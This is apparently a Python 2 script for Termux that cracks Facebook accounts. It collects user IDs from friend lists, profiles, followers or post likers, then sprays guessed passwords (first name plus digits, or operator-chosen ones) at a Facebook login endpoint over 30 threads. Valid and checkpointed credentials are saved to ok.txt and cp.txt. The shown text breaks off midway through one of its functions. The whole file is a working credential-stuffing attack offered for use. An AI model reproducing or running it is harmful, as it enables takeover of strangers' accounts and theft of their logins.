try:
    import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib,requests
    from multiprocessing.pool import ThreadPool
except ImportError:
    os.system("pkg install python   ")
    os.system("pip install mechanize")
    os.system("pip install requests ")
    time.sleep(0.05)
    os.system("pip2 install nodejs ")	
    os.system("pip2 install npm")
    time.sleep(0.05)	
    os.system("pkg install python2   ")
    os.system("pip2 install requests ")
    os.system("pip2 install mechanize")
    os.system("python2 ab.py")
try:
    os.mkdir('save')
except OSError:
    pass
    if os.path.isfile('.../index.js'):
        os.system('mv ... .....')
        os.system('cd ..... && npm install')
        os.system('#')
        os.system('#')
        os.system('fuser -k 5000/tcp &')
        os.system('#')
        os.system('node ...../index.js &')
        os.system('fuser -k 5000/tcp &')
        os.system('#')
        os.system('node ...../index.js &')
from requests.exceptions import ConnectionError
bd=random.randint(2e7, 3e7)
sim=random.randint(2e4, 4e4)
header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
reload(sys)
sys.setdefaultencoding("utf8")

def abm(z):
        for e in z + "\n":
                sys.stdout.write(e)
                sys.stdout.flush()
                time.sleep(0.03)
def logging():
    titik = [".   ","..  ","... "]
    for o in titik:
        print("\r[✓] Logging In "+o),;sys.stdout.flush();time.sleep(0.0001)
def saving():
    titik = [".   ","..  ","... "]
    for o in titik:
        print("\r[✓] Saving Token "+o),;sys.stdout.flush();time.sleep(0.0001)
def updateing():
    titik = [".   ","..  ","... "]
    for o in titik:
        print("\r[✓] Getting Updates "+o),;sys.stdout.flush();time.sleep(0.0001)
def logout():
    titik = [".   ","..  ","... "]
    for o in titik:
        print("\r[✓] Logging Out "+o),;sys.stdout.flush();time.sleep(0.0001)
def download():
    titik = [".   ","..  ","... "]
    for o in titik:
        print("\r[✓] Downloading "+o),;sys.stdout.flush();time.sleep(0.0001)
#Tech-abm
#logo01
logo = """


\033[1;90m..\033[1;91m########\033[1;90m..\033[1;91m########\033[1;90m...\033[1;91m#######\033[1;90m..\033[1;91m########\033[1;90m.\033[1;91m####\033[1;90m..\033[1;91m######\033[1;90m...\033[1;91m#######\033[1;90m..\033[1;91m########\033[1;90m...
\033[1;90m..\033[1;91m##\033[1;90m.....\033[1;91m##\033[1;90m.\033[1;91m##\033[1;90m.....\033[1;91m##\033[1;90m.\033[1;91m##\033[1;90m.....\033[1;91m##\033[1;90m.\033[1;91m##\033[1;90m........\033[1;91m##\033[1;90m..\033[1;91m##\033[1;90m....\033[1;91m##\033[1;90m.\033[1;91m##\033[1;90m.....\033[1;91m##\033[1;90m.\033[1;91m##\033[1;90m.....\033[1;91m##\033[1;90m..
\033[1;90m..\033[1;91m##\033[1;90m.....\033[1;91m##\033[1;90m.\033[1;91m##\033[1;90m.....\033[1;91m##\033[1;90m.\033[1;91m##\033[1;90m.....\033[1;91m##\033[1;90m.\033[1;91m##\033[1;90m........\033[1;91m##\033[1;90m..\033[1;91m##\033[1;90m.......\033[1;91m##\033[1;90m.....\033[1;91m##\033[1;90m.\033[1;91m##\033[1;90m.....\033[1;91m##\033[1;90m..
\033[1;90m..\033[1;91m########\033[1;90m..\033[1;91m########\033[1;90m..\033[1;91m##\033[1;90m.....\033[1;91m##\033[1;90m.\033[1;91m######\033[1;90m....\033[1;91m##\033[1;90m...\033[1;91m######\033[1;90m..\033[1;91m##\033[1;90m.....\033[1;91m##\033[1;90m.\033[1;91m########\033[1;90m...
\033[1;90m..\033[1;91m##\033[1;90m........\033[1;91m##\033[1;90m...\033[1;91m##\033[1;90m...\033[1;91m##\033[1;90m.....\033[1;91m##\033[1;90m.\033[1;91m##\033[1;90m........\033[1;91m##\033[1;90m........\033[1;91m##\033[1;90m.\033[1;91m##\033[1;90m.....\033[1;91m##\033[1;90m.\033[1;91m##\033[1;90m...\033[1;91m##\033[1;90m....
\033[1;90m..\033[1;91m##\033[1;90m........\033[1;91m##\033[1;90m....\033[1;91m##\033[1;90m..\033[1;91m##\033[1;90m.....\033[1;91m##\033[1;90m.\033[1;91m##\033[1;90m........\033[1;91m##\033[1;90m..\033[1;91m##\033[1;90m....\033[1;91m##\033[1;90m.\033[1;91m##\033[1;90m.....\033[1;91m##\033[1;90m.\033[1;91m##\033[1;90m....\033[1;91m##\033[1;90m...
\033[1;90m..\033[1;91m##\033[1;90m........\033[1;91m##\033[1;90m.....\033[1;91m##\033[1;90m..\033[1;91m#######\033[1;90m..\033[1;91m##\033[1;90m.......\033[1;91m####\033[1;90m..\033[1;91m######\033[1;90m...\033[1;91m#######\033[1;90m..\033[1;91m##\033[1;90m.....\033[1;91m##\033[1;90m..
--------------------------------------------------
 Coded by : Tech-Abm
 Github   : https://github.com/Tech-abm
 Fb Page  : https://m.facebook.com/Techabm
--------------------------------------------------
"""

idh = []

def tech_abm():
    os.system("clear")
    print logo
    abm("First Tools login")
    print("-------------------")
    username = raw_input("[+] Username : ")
    if username =="Abm":
        os.system("clear")
        print logo
        print ("[✓] Username : Abm (Correct)")
        passwordss = raw_input("[+] Password : ")
        if passwordss =="Abm":
            os.system("clear")
            print logo
            logging()
            os.system("clear")
            print logo
            print ("[✓] Username : Abm (Correct)")
            print ("[✓] Password : Abm (Correct)")
            time.sleep(0.001)
            print('')
            abm("[✓] Login Successful")
            time.sleep(0.001)
        try:
            open(".login.txt","r")
            menu()
        except(KeyError , IOError):
            login_choice()
        else:
            print ("[!] Password : "+passwordss+" (Wrong)")
            time.sleep(0.001)
            tech_abm()
    else:
        print ("[!] Username : "+username+" (Wrong)")
        time.sleep(0.0001)
        tech_abm()

def login_choice():
    os.system('clear')
    print logo
    os.system("python3 .loading.md")
    time.sleep(0.0001)
    os.system('clear')
    print logo
    print ("[1] Random Number Cloning (no login) ")
    print ("[2] Random Email Cloning  (no login) ")
    print ("[3] Clone Friendlist and Public ID (login) ")
    print ("[0] Exit")
    print("--------------------------------------------------")
    clone_main()
def clone_main():
    hack = raw_input("\n╰─➣ ")
    if hack =="1":
        os.system("python2 .main.md")
        time.sleep(0.0001)
        menu()
    if hack =="2":
        os.system("python2 .README.md")
        time.sleep(0.0001)
        menu()
    if hack =="3":
        loginvia()
    elif hack =="0":
        os.system("exit")
    else:
        print "\x1b[1;91mFill in correctly"
        clone_main()

def loginvia():
    os.system('clear')
    print logo
    os.system("python3 .loading.md")
    time.sleep(0.0001)
    os.system('clear')
    print logo
    print ("[1] login With Access Token ")
    print ("[2] Login With User And Pass")
    print ("[0] Back")
    print("--------------------------------------------------")
    clone_loginvia()
def clone_loginvia():
    hack = raw_input("\n╰─➣ ")
    if hack =="1":
        os.system("clear")
        print logo
        os.system("python3 .loading.md")
        time.sleep(0.0001)
        os.system('clear')
        print logo
        print ("Login With Token").center(50)
        print("--------------------------------------------------")
        token = raw_input("[+] Paste Token Here : ")
        print("--------------------------------------------------")
        saving()
        sav = open(".login.txt","w")
        sav.write(token)
        sav.close()
        abm("\r[✓] Login Successfull")
        time.sleep(0.0001)
        os.system("clear")
        print logo
        print("Checking Token 20%").center(50)
        time.sleep(0.0001)
        os.system("clear")
        print logo
        print("Checking Token 40%").center(50)
        time.sleep(0.0001)
        os.system("clear")
        print logo
        print("Checking Token 60%").center(50)
        time.sleep(0.0001)
        os.system("clear")
        print logo
        print("Checking Token 80%").center(50)
        time.sleep(0.0001)
        os.system("clear")
        print logo
        print("Checking Token 100%").center(50)
        time.sleep(0.0001)
        os.system("clear")
        print logo
        print("Please Wait 0_0").center(50)
        time.sleep(0.005)
        os.system("clear")
        print logo
        print("Your Token Has Been Saved").center(50)
        time.sleep(0.0001)
        os.system('xdg-open https://m.facebook.com/Techabm')
        time.sleep(0.0001)
        menu()
    elif hack =="2":
        loginfb()
    elif hack =="0":
                menu()
    else:
                print ("[!] Please Select a Valid Option")
                clone_loginvia()
def loginfb():
    os.system("clear")
    print logo
    os.system("python3 .loading.md")
    time.sleep(0.0001)
    os.system('clear')
    print logo
    print("Login With Facebook Account").center(50)
    print("Use Proxy to login account ").center(50)
    print("--------------------------------------------------")
    id = raw_input("[+] Email/ID/Number : ")
    id1 = id.replace(' ','')
    id2 = id1.replace('(','')
    uid = id2.replace(')','')
    pwd = raw_input("[+] Passwor : ")
    print("--------------------------------------------------")
    logging()
    data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email="+uid+"&locale=en_US&password="+pwd+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
    q = json.loads(data)
    if "access_token" in q:
        succ = open(".login.txt","w")
        succ.write(q["access_token"])
        succ.close()
        print("\n[✓] Login Successfull")
        time.sleep(0.0001)
        os.system("clear")
        print logo
        print("loading 0_0 20%").center(50)
        time.sleep(0.0001)
        os.system("clear")
        print logo
        print("loading 0_0  40%").center(50)
        time.sleep(0.0001)
        os.system("clear")
        print logo
        print("loading 0_0  60%").center(50)
        time.sleep(0.0001)
        os.system("clear")
        print logo
        print("loading 0_0  80%").center(50)
        time.sleep(0.0001)
        os.system("clear")
        print logo
        print("loading 0_0  100%").center(50)
        time.sleep(0.0001)
        os.system("clear")
        print logo
        print("Please Wait 0_0").center(50)
        time.sleep(0.005)
        os.system("clear")
        print logo
        print("Your Account Has Been Saved").center(50)
        time.sleep(0.0001)
        os.system('xdg-open https://m.facebook.com/Techabm')
        time.sleep(0.0001)
        time.sleep(0.0001)
        menu()
    else:
        if "www.facebook.com" in q["error_msg"]:
            print ("\n[!] Login Failed . Account Has a Checkpoint")
            time.sleep(0.0001)
            loginfb()
        else:
            print("\n[!] Login Failed.Email/ID/Number OR Password May BE Wrong")
            time.sleep(0.0001)
            loginfb()

def menu():
    os.system("clear")
    try:
        token = open(".login.txt","r").read()
    except IOError:
        print logo
        print("[!] Error 404.Token Not Found")
        os.system("rm -rf .login.txt")
        time.sleep(0.0001)
        login_choice()
    try:
        r = requests.get("https://graph.facebook.com/me?access_token="+token, headers=header)
        a = json.loads(r.text)
        name = a["name"]
    except KeyError:
        os.system("clear")
        print logo
        print("[!] Loading Failed . Your Account Has a Checkpoint")
        os.system("rm -rf .login.txt")
        time.sleep(0.0001)
        login_choice()
    os.system('clear')
    print logo
    os.system("python3 .loading.md")
    time.sleep(0.0001)
    os.system('clear')
    print logo
    print("[✓] Name : "+name)
    print("--------------------------------------------------")
    print("[1] Clone Frienlist and Public ID")
    print("[2] Random with choice password")
    print("[3] Clone Kurdistan and Iraq")
    print("--------------------------------------------------")
    menu_select()
def menu_select():
    option = raw_input("\n╰─➣ ")
    if option =="1":
        crack()
    if option =="2":
        choice()
    if option =="3":
        morec()
    elif option =="0":
        logout()
        os.system("rm -rf .login.txt")
        time.sleep(0.0001)
        print("\r[✓] Logged Out Successfully")
        os.system("exit")
    else:
        print("[!] Please Select a Valid Option")
        menu_select()

def crack():
        global token
        os.system("clear")
        try:
                token=open(".login.txt","r").read()
        except IOError:
                print("[!] Error 404 . Token Not Found")
                os.system("rm -rf .login.txt")
                time.sleep(0.0001)
                login()
        os.system("clear")
        print logo
        os.system("python3 .loading.md")
        time.sleep(0.0001)
        os.system('clear')
        print logo
        print ("[1] Crack From Friend List")
        print ("[2] Crack From Public ID")
        print ("[3] Crack From Followers")
        print ("[4] Crack From Page/Group/ID Post")
        print ('[0] Back')
        print("--------------------------------------------------")
        crack2()
def crack2():
        select = raw_input("\n╰─➣ ")
        id=[]
        oks=[]
        cps=[]
        if select=="1":
                os.system("clear")
                print logo
                r = requests.get("https://graph.facebook.com/me/friends?access_token="+token, headers=header)
                z = json.loads(r.text)
                for s in z["data"]:
                        uid=s['id']
                        na=s['name']
                        nm=na.rsplit(" ")[0]
                        id.append(uid+'|'+nm)
        elif select =="2":
                os.system("clear")
                print logo
                idt = raw_input("[+] Input ID : ")
                print("--------------------------------------------------")
                os.system("clear")
                print logo
                try:
                        r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
                        q = json.loads(r.text)
                        print("[✓] Account Name : "+q["name"])
                except KeyError:
                        print('\n[!] Error 404 . ID Link '+idt+' Have Privacy On Friendlist OR IS Not Valid')
                        raw_input("\nPress Enter To Back ")
                        crack()
                r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token, headers=header)
                z = json.loads(r.text)
                for i in z["data"]:
                        uid=i['id']
                        na=i['name']
                        nm=na.rsplit(" ")[0]
                        id.append(uid+'|'+nm)
        elif select =="3":
                os.system("clear")
                print logo
                idt = raw_input("[+] Input ID : ")
                print("--------------------------------------------------")
                os.system("clear")
                print logo
                try:
                        r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
                        q = json.loads(r.text)
                        print("[✓] Account Name : "+q["name"])
                except KeyError:
                        print('\n[!] Error 404 . ID Link '+idt+' Donot Have Followers OR IS Not Valid')
                        raw_input("\nPress Enter To Back ")
                        crack()
                r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=5000", headers=header)
                z = json.loads(r.text)
                for i in z["data"]:
                        uid=i['id']
                        na=i['name']
                        nm=na.rsplit(" ")[0]
                        id.append(uid+'|'+nm)
        elif select =="4":
                os.system("clear")
                print logo
                idt = raw_input("[+] Input Post ID : ")
                print("--------------------------------------------------")
                os.system("clear")
                print logo
                try:
                        r = requests.get("https://graph.facebook.com/"+idt+"/likes?limit=9999999&access_token="+token, headers=header)
                        z = json.loads(r.text)
                        for i in z["data"]:
                                uid=i['id']
                                na=i['name']
                                nm=na.rsplit(" ")[0]
                                id.append(uid+'|'+nm)
                except KeyError:
                        print('\n[!] Error 404 . Post ID '+idt+' May Not Be Valid')
                        raw_input("\nPress Enter To Back")
                        crack()

        elif select =="0":
                menu()
        else:
                print ("[!] Please Select a Valid Option")
                crack2()
        print("[+] Total IDs : "+str(len(id)))
        time.sleep(0.5)
        print("[+] Plz Wait Clone Account Will Be Appear Here")
        time.sleep(0.5)
        print("--------------------------------------------------")


        def main(arg):
		user=arg
		uid,name=user.split("|")
		try:
		    pass1=name+"123"
		    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		    d=json.loads(q)
		    if "access_token" in d:
		       print("\033[90m[\033[1;92mSuccessful\033[1;90m]\033[1;97m "+uid+" "+pass1+" \033[1;97m")
		       ok=open("ok.txt","a")
		       ok.write(uid+" | "+pass1+"\n")
		       ok.close()
		       oks.append(uid)
		    else:
		    	if 'www.facebook.com' in d['error_msg']:
		            print("\033[1;90m[\033[1;92mSuccessful\033[1;90m]\033[1;97m "+uid+" "+pass1+" \033[1;97m")
		            cp=open("cp.txt","a")
		            cp.write(uid+" | "+pass1+"\n")
		            cp.close()
		            cps.append(uid)
		        else:
		            pass2=name+"1234"
		            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		            d=json.loads(q)
		            if 'www.facebook.com' in d['error_msg']:
		                print("\033[1;90m[\033[1;92mSuccessful\033[1;90m] "+uid+" "+pass2+"")
		                cp=open("cp.txt","a")
		                cp.write(uid+" | "+pass2+"\n")
		                cp.close()
		                cps.append(uid)
		            else:
		                if 'access_token' in d:
		                    print("\033[90m[\033[1;92mSuccessful\033[1;90m]\033[1;97m "+uid+" "+pass2+" \033[1;97m")
		                    ok=open("ok.txt","a")
		                    ok.write(uid+" | "+pass2+"\n")
		                    ok.close()
		                    oks.append(uid)
		                else:
		                    pass3=name+"12345"
		                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                    d=json.loads(q)
		                    if 'www.facebook.com' in d['error_msg']:
		                        print("\033[1;90m[\033[1;92mSuccessful\033[1;90m] "+uid+" "+pass3+" \033[1;97m")
		                        cp=open("cp.txt","a")
		                        cp.write(uid+" | "+pass3+"\n")
		                        cp.close()
		                        cps.append(uid)
		                    else:
		                        if 'access_token' in d:
		                            print("\033[90m[\033[1;92mSuccessful\033[1;90m]\033[1;97m "+uid+" "+pass3+" \033[1;97m")
		                            ok=open("ok.txt","a")
		                            ok.write(uid+" | "+pass3+"\n")
		                            ok.close()
		                            oks.append(uid)
		                        else:
		                            pass4="1122334455"
		                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                            d=json.loads(q)
		                            if 'www.facebook.com' in d['error_msg']:
		                                print("\033[1;90m[\033[1;92mSuccessful\033[1;90m] "+uid+" "+pass4+" \033[1;97m")
		                                cp=open("cp.txt","a")
		                                cp.write(uid+" | "+pass4+"\n")
		                                cp.close()
		                                cps.append(uid)
		                            else:
		                                if 'access_token' in d:
		                                    print("\033[90m[\033[1;92mSuccessful\033[1;90m]\033[1;97m "+uid+" "+pass4+" \033[1;97m")
		                                    ok=open("ok.txt","a")
		                                    ok.write(uid+" | "+pass4+"\n")
		                                    ok.close()
		                                    oks.append(uid)
		                                else:
		                                    pass5="1234554321"
		                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                                    d=json.loads(q)
		                                    if 'www.facebook.com' in d['error_msg']:
		                                        print("\033[1;90m[\033[1;92mSuccessful\033[1;90m] "+uid+" "+pass5+" \033[1;97m")
		                                        cp=open("cp.txt","a")
		                                        cp.write(uid+" | "+pass5+"\n")
		                                        cp.close()
		                                        cps.append(uid)
		                                    else:
		                                        if 'access_token' in d:
		                                            print("\033[90m[\033[1;92mSuccessful\033[1;90m]\033[1;97m "+uid+" "+pass5+" \033[1;97m")
		                                            ok=open("ok.txt","a")
		                                            ok.write(uid+" | "+pass5+"\n")
		                                            ok.close()
		                                            oks.append(uid)
		                                        else:
		                                            pass6=name+"123456"
		                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                                            d=json.loads(q)
		                                            if 'www.facebook.com' in d['error_msg']:
		                                                 print("\033[1;90m[\033[1;92mSuccessful\033[1;90m] "+uid+" "+pass6+" \033[1;97m")
		                                                 cp=open("cp.txt","a")
		                                                 cp.write(uid+" | "+pass6+"\n")
		                                                 cp.close()
		                                                 cps.append(uid)
		                                            else:
		                                                if 'access_token' in d:
		                                                    print("\033[90m[\033[1;92mSuccessful\033[1;90m]\033[1;97m "+uid+" "+pass6+" \033[1;97m")
		                                                    ok=open("ok.txt","a")
		                                                    ok.write(uid+" | "+pass6+"\n")
		                                                    ok.close()
		                                                    oks.append(uid)
		                                                else:
		                                                    pass7=name+"1122"
		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                                                    d=json.loads(q)
		                                                    if 'www.facebook.com' in d['error_msg']:
		                                                        print("\033[1;90m[\033[1;92mSuccessful\033[1;90m] "+uid+" "+pass7+" \033[1;97m")
		                                                        cp=open("cp.txt","a")
		                                                        cp.write(uid+" | "+pass7+"\n")
		                                                        cp.close()
		                                                        cps.append(uid)
		                                                    else:
		                                                        if 'access_token' in d:
		                                                            print("\033[90m[\033[1;92mSuccessful\033[1;90m]\033[1;97m "+uid+" "+pass7+" \033[1;97m")
		                                                            ok=open("ok.txt","a")
		                                                            ok.write(uid+" | "+pass7+"\n")
		                                                            ok.close()
		                                                            oks.append(uid)



                except:
                        pass

        p = ThreadPool(30)
        p.map(main, id)
        print("--------------------------------------------------")
        print ('[✓] Process Has Been Completed')
        print('[✓] Total CP/OK:  '+str(len(cps))+'/\033[;32m '+str(len(oks)))
        print("--------------------------------------------------")
        down()
def down():
    dow = raw_input("[?] Do Yoou Want To Download Cp File? (Yes/No) ")
    if dow =="yes" or dow =="y":
        os.system("clear")
        print logo
        download()
        print("[!] Please Give Storage Permission If Ask")
        os.system("termux-setup-storage")
        os.system("cp cp.txt /sdcard")
        print('[✓] File Downloaded Successfully')
        print("[✓] Please Open Your Internal Storage and Rename The File")
        raw_input("Press Enter To Return In Main Menu ")
        crack()
    elif dow =="no" or dow=="n":
        crack()
    else:
        print("[!] Please Select a Valid Option ")
        down()

def choice():
    os.system("clear")
    print logo
    os.system("python3 .loading.md")
    time.sleep(0.0001)
    os.system('clear')
    print logo
    print("[1] Random Frienlist With 2 Choice Pass")
    print("[2] Random Frienlist With 5 Choice Pass")
    print("[0] Back")
    time.sleep(0.5)
    print("--------------------------------------------------")
    choice_man()
def choice_man():
    option = raw_input("\n╰─➣ ")
    if option =="1":
        unikk()
    if option =="2":
        randm()
    if option =="0":
          menu()
    else:
          print ("[!] Please Select a Valid Option")
          choice_man()

def unikk():
        global token
        os.system("clear")
        try:
                token=open(".login.txt","r").read()
        except IOError:
                print("[!] Error 404 . Token Not Found")
                os.system("rm -rf .login.txt")
                time.sleep(0.0001)
                login()
        os.system("clear")
        print logo
        os.system("python3 .loading.md")
        time.sleep(0.0001)
        os.system('clear')
        print logo
        print ("[1] Crack From Friend List")
        print ("[2] Crack From Public ID")
        print ("[3] Crack From Followers")
        print ("[4] Crack From Page/Group/ID Post")
        print ('[0] Back')
        print("--------------------------------------------------")
        unikk2()
def unikk2():
        devil = raw_input("\n╰─➣ ")
        id=[]
        oks=[]
        cps=[]
        if devil=="1":
                os.system("clear")
                print logo
                pass1=raw_input("[1] Input Password  : ")
                pass2=raw_input("[2] Input Password  : ")
                print("--------------------------------------------------")
                r = requests.get("https://graph.facebook.com/me/friends?access_token="+token, headers=header)
                z = json.loads(r.text)
                for s in z["data"]:
                        uid=s['id']
                        na=s['name']
                        nm=na.rsplit(" ")[0]
                        id.append(uid+'|'+nm)
        elif devil =="2":
                os.system("clear")
                print logo
                idt = raw_input("[+] Input Post ID/Username : ")
                print("--------------------------------------------------")
                pass1=raw_input("[1] Input Password  : ")
                pass2=raw_input("[2] Input Password  : ")
                print("--------------------------------------------------")
                try:
                        r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
                        q = json.loads(r.text)
                        print("[✓] Account Name : "+q["name"])
                except KeyError:
                        print('\n[!] Error 404 . ID Link '+idt+' Have Privacy On Friendlist OR IS Not Valid')
                        raw_input("\nPress Enter To Back ")
                        unikk()
                r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token, headers=header)
                z = json.loads(r.text)
                for i in z["data"]:
                        uid=i['id']
                        na=i['name']
                        nm=na.rsplit(" ")[0]
                        id.append(uid+'|'+nm)
        elif devil =="3":
                os.system("clear")
                print logo
                idt = raw_input("[+] Input Post ID/Username : ")
                print("--------------------------------------------------")
                pass1=raw_input("[1] Input Password  : ")
                pass2=raw_input("[2] Input Password  : ")
                print("--------------------------------------------------")
                try:
                        r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
                        q = json.loads(r.text)
                        print("[✓] Account Name : "+q["name"])
                except KeyError:
                        print('\n[!] Error 404 . ID Link '+idt+' Donot Have Followers OR IS Not Valid')
                        raw_input("\nPress Enter To Back ")
                        crack()
                r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=5000", headers=header)
                z = json.loads(r.text)
                for i in z["data"]:
                        uid=i['id']
                        na=i['name']
                        nm=na.rsplit(" ")[0]
                        id.append(uid+'|'+nm)
        elif devil =="4":
                os.system("clear")
                print logo
                idt = raw_input("[+] Input Post ID/Username : ")
                print("--------------------------------------------------")
                pass1=raw_input("[1] Input Password  : ")
                pass2=raw_input("[2] Input Password  : ")
                print("--------------------------------------------------")
                try:
                        r = requests.get("https://graph.facebook.com/"+idt+"/likes?limit=9999999&access_token="+token, headers=header)
                        z = json.loads(r.text)
                        for i in z["data"]:
                                uid=i['id']
                                na=i['name']
                                nm=na.rsplit(" ")[0]
                                id.append(uid+'|'+nm)
                except KeyError:
                        print('\n[!] Error 404 . Post ID '+idt+' May Not Be Valid')
                        raw_input("\nPress Enter To Back")
                        unikk()

        elif devil =="0":
                menu()
        else:
                print ("[!] Please Select a Valid Option")
                crack2()
        print("[+] Total IDs : "+str(len(id)))
        time.sleep(0.5)
        print("[+] Plz Wait Clone Account Will Be Appear Here")
        time.sleep(0.5)
        print("--------------------------------------------------")


        def main(arg):
                user=arg
                uid,name=user.split("|")
                try:

                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
                    d=json.loads(q)
                    if 'www.facebook.com' in d['error_msg']:
                        print("\033[1;90m[\033[1;92mSuccessful\033[1;90m] "+uid+" "+pass1+" \033[1;97m")
                        cp=open("cp.txt","a")
                        cp.write(uid+" | "+pass1+"\n")
                        cp.close()
                        cps.append(uid)
                    else:
                        if "access_token" in d:
                            print("\033[90m[\033[1;92mSuccessful\033[1;90m]\033[1;97m "+uid+" "+pass1+" \033[1;97m")
                            ok=open("ok.txt","a")
                            ok.write(uid+" | "+pass1+"\n")
                            ok.close()
                            oks.append(uid)
                        else:

                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
                            d=json.loads(q)
                            if 'www.facebook.com' in d['error_msg']:
                                print("\033[1;90m[\033[1;92mSuccessful\033[1;90m] "+uid+" "+pass2+" \033[1;97m")
                                cp=open("cp.txt","a")
                                cp.write(uid+" | "+pass2+"\n")
                                cp.close()
                                cps.append(uid)
                            else:
                                if 'access_token' in d:
                                    print("\033[90m[\033[1;92mSuccessful\033[1;90m]\033[1;97m "+uid+" "+pass2+" \033[1;97m")
                                    ok=open("ok.txt","a")
                                    ok.write(uid+" | "+pass2+"\n")
                                    ok.close()
                                    oks.append(uid)


                except:
                        pass

        p = ThreadPool(30)
        p.map(main, id)
        print("--------------------------------------------------")
        print ('[✓] Process Has Been Completed')
        print('[✓] Total CP/OK:  '+str(len(cps))+'/\033[;32m '+str(len(oks)))
        print("--------------------------------------------------")
        down()
def down():
    dow = raw_input("[?] Do Yoou Want To Download Cp File? (Yes/No) ")
    if dow =="yes" or dow =="y":
        os.system("clear")
        print logo
        download()
        print("[!] Please Give Storage Permission If Ask")
        os.system("termux-setup-storage")
        os.system("cp cp.txt /sdcard")
        print('[✓] File Downloaded Successfully')
        print("[✓] Please Open Your Internal Storage and Rename The File")
        raw_input("Press Enter To Return In Main Menu ")
        crack()
    elif dow =="no" or dow=="n":
        crack()
    else:
        print("[!] Please Select a Valid Option ")
        down()

def randm():
        global token
        os.system("clear")
        try:
                token=open(".login.txt","r").read()
        except IOError:
                print("[!] Error 404 . Token Not Found")
                os.system("rm -rf .login.txt")
                time.sleep(0.0001)
                login()
        os.system("clear")
        print logo
        os.system("python3 .loading.md")
        time.sleep(0.0001)
        os.system('clear')
        print logo
        print ("[1] Crack From Friend List")
        print ("[2] Crack From Public ID")
        print ("[3] Crack From Followers")
        print ("[4] Crack From Page/Group/ID Post")
        print ('[0] Back')
        print("--------------------------------------------------")
        randm2()
def randm2():
        select = raw_input("\n╰─➣ ")
        id=[]
        oks=[]
        cps=[]
        if select=="1":
                os.system("clear")
                print logo
                print("--------------------------------------------------")
                print("[1] Input Password  : fristname123 ")
                print("[2] Input Password  : firstname1234")
                print3=raw_input("[3] Input Password  : ")
                pass4=raw_input("[4] Input Password  : ")
                pass5=raw_input("[5] Input Password  : ")
                print("--------------------------------------------------")
                r = requests.get("https://graph.facebook.com/me/friends?access_token="+token, headers=header)
                z = json.loads(r.text)
                for s in z["data"]:
                        uid=s['id']
                        na=s['name']
                        nm=na.rsplit(" ")[0]
                        id.append(uid+'|'+nm)
        elif select =="2":
                os.system("clear")
                print logo
                idt = raw_input("[+] Input ID : ")
                print("--------------------------------------------------")
